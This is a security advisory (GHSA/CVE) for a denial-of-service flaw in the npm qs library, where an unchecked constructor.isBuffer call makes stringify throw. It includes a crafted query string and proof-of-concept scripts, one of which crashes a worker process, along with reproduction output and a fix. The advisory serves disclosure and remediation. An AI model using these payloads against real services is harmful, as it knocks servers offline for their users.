# qs: Denial of Service via Attacker Controlled isBuffer

- GHSA: GHSA-4mjr-xmp4-gh2g
- CVE: CVE-2026-82417
- Published: 2026-09-02T14:45:13Z
- GHSA severity: medium
- CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (5.3)
- CWE: CWE-248, CWE-703
- Packages: npm:qs
- Source: https://github.com/advisories/GHSA-4mjr-xmp4-gh2g

---

### Summary

`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.

An attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.

### Details
`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:

```js
if (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }
```

`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:

```js
var isBuffer = function isBuffer(obj) {
    if (!obj || typeof obj !== 'object') { return false; }
    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));
};
```

`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.


### Trust Boundary Note

`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. 


### PoC
`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:

```js
'use strict';
var qs = require('qs');

var untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y

var parsed = qs.parse(untrustedQueryString, { plainObjects: true });
console.log('[parse] kept constructor key:', JSON.stringify(parsed));

try {
    qs.stringify(parsed);
    console.log('[stringify] no throw (unexpected)');
} catch (e) {
    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);
}
```

`poc02_isBuffer.js` — the minimal defect:

```js
'use strict';
var qs = require('qs');
try {
    qs.stringify(JSON.parse('{"a":{"constructor":{"isBuffer":"x"}}}'));
} catch (e) {
    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);
}
```

`poc02b_isBuffer_async_crash.js` — worker death in an async sink:

```js
'use strict';
var qs = require('qs');

function handleRequestAsync(clientJsonBody) {
    try {
        setImmediate(function () {                 // async continuation, outside the try
            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught
        });
        console.log('[handler] returned 200 synchronously; async work scheduled');
    } catch (e) {
        console.log('[handler] caught synchronously (will NOT happen):', e.message);
    }
}
process.on('exit', function (code) {
    console.log('[proc] process exiting with code:', code);
});
handleRequestAsync('{"filters":{"constructor":{"isBuffer":"x"}}}');
```

### Execution Steps

```bash
cd poc
npm install qs@6.15.3
node poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError
node poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify
node poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1
```

### Reproduction Evidence

`poc02c_isBuffer_qs_only_roundtrip.js` :

```
[parse] kept constructor key: {"x":{"constructor":{"isBuffer":"y"}}}
[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function
```

`poc02_isBuffer.js`:

```
[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function
```

`poc02b_isBuffer_async_crash.js` :

```
[handler] returned 200 synchronously; async work scheduled
[proc] process exiting with code: 1
TypeError: obj.constructor.isBuffer is not a function
    at Object.isBuffer (.../qs/lib/utils.js:332:78)
    at stringify (.../qs/lib/stringify.js:127:45)
=== EXIT CODE: 1 ===
```

The pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.

### Impact

An unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.

### Recommended Fix

Replace the duck-type with a brand check mirroring `utils.isRegExp`:

```js
var isBuffer = function isBuffer(obj) {
    if (!obj || typeof obj !== 'object') { return false; }
    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {
        return Buffer.isBuffer(obj);
    }
    return Object.prototype.toString.call(obj) === '[object Uint8Array]';
};
```

If duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.
